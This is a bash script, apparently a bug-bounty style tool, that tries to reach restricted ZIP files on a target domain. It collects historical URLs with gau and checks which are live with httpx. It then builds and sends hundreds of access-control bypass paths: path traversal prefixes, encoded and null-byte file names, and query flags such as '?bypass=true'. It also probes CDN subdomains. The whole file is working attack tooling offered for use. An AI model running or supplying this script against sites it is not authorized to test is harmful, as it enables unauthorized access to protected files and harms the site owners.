#!/bin/bash

# BINZIP HUNTER TOOL
# Author: @themasterdoctor1
# Description: Full-scope recon and bypass tool for restricted .zip/.bin.zip files

TARGET_DOMAIN="$1"
FILE_NAME="$2"

if [[ -z "$TARGET_DOMAIN" || -z "$FILE_NAME" ]]; then
  echo "Usage: ./binzip_hunter.sh <domain.com> <file.zip>"
  exit 1
fi

OUT_DIR="binzip_scan_$(date +%s)"
mkdir -p "$OUT_DIR"

echo "[*] Starting ZIP recon on $TARGET_DOMAIN for $FILE_NAME"

# 1. GAU Historical ZIP Discovery
echo "[*] Gathering historical URLs with gau..."
gau "$TARGET_DOMAIN" | grep -i "$FILE_NAME" | tee "$OUT_DIR/gau-urls.txt"

# 2. HTTPX Live Check
echo "[*] Checking which URLs are live (200 OK)..."
cat "$OUT_DIR/gau-urls.txt" | httpx -silent -mc 200 -title -location | tee "$OUT_DIR/live.txt"

# 3. Generate 300+ bypass payloads
echo "[*] Generating bypass payloads..."
touch "$OUT_DIR/bypass_attempts.txt"

PAYLOADS=( "" "/" "%20" "%09" "%00" "%0A" "%0D" "#" "?" 
  "?download=1" "?dl=1" "?file=true" "?access=1" "?bypass=true" )

ENCODED_NAMES=( "$FILE_NAME" \
  "$(echo $FILE_NAME | sed 's/\\./%2E/g')" \
  "$(echo $FILE_NAME | sed 's/\\./%252E/g')" \
  "$(echo $FILE_NAME | tr a-z A-Z)" \
  "$(echo $FILE_NAME | tr A-Z a-z)" )

PREFIXES=( "" "./" "../" "../../" "/public/" "/downloads/" "/files/" "/static/" "/cdn/" "/old/" )

for prefix in "${PREFIXES[@]}"; do
  for name in "${ENCODED_NAMES[@]}"; do
    for suffix in "${PAYLOADS[@]}"; do
      echo "$prefix$name$suffix" >> "$OUT_DIR/bypass_attempts.txt"
    done
    echo "$prefix$name/" >> "$OUT_DIR/bypass_attempts.txt"
  done
done

sort -u "$OUT_DIR/bypass_attempts.txt" > "$OUT_DIR/unique-bypass.txt"

# 4. HTTPX Bypass Testing
echo "[*] Testing bypass payloads..."
cat "$OUT_DIR/unique-bypass.txt" | sed "s|^|https://$TARGET_DOMAIN/|" | httpx -silent -mc 200 -title -location | tee "$OUT_DIR/bypass-results.txt"

# 5. Wayback Machine Check
echo "[*] Checking Wayback Machine..."
echo "https://web.archive.org/web/*/https://$TARGET_DOMAIN/public/$FILE_NAME" > "$OUT_DIR/wayback-url.txt"

# 6. CDN Mirror Brute
echo "[*] Probing common CDN mirrors..."
for prefix in cdn static media files content assets cache download storage; do
  echo "https://$prefix.$TARGET_DOMAIN/public/$FILE_NAME" >> "$OUT_DIR/cdn-list.txt"
done

cat "$OUT_DIR/cdn-list.txt" | httpx -silent -mc 200 | tee "$OUT_DIR/cdn-results.txt"

# 7. Wrap up
echo "[+] Scan complete."
echo "[+] All output saved in: $OUT_DIR"
ls -l "$OUT_DIR"
